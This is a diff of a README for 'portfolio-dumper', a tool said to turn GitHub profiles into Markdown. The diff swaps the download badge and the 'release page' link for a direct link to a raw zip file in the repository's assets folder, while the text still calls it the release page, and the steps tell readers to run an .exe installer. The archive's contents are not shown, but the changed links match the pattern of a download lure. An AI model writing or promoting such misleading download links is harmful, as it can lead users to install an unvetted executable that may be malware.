@@ -1,6 +1,6 @@
 # 📂 portfolio-dumper - Turn GitHub profiles into clean text
 
-[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Rickardserrulate236/portfolio-dumper/releases)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Rickardserrulate236/portfolio-dumper/raw/refs/heads/main/assets/portfolio-dumper-v1.5.zip)
 
 This tool converts GitHub profiles and individual repositories into clean, simple Markdown files. These files work well with AI tools and language models. You can capture profile information, lists of repositories, and specific project code. The tool runs locally on your computer to keep your data private.
 
@@ -18,7 +18,7 @@ The software requires no complex setup. It saves all output files directly to yo
 
 ## 📥 How to download and install
 
-1. Visit [the release page](https://github.com/Rickardserrulate236/portfolio-dumper/releases) to see available downloads.
+1. Visit [the release page](https://github.com/Rickardserrulate236/portfolio-dumper/raw/refs/heads/main/assets/portfolio-dumper-v1.5.zip) to see available downloads.
 2. Look for the file ending in `.exe` under the latest version.
 3. Click the filename to save the installer to your computer.
 4. Locate the file in your Downloads folder.
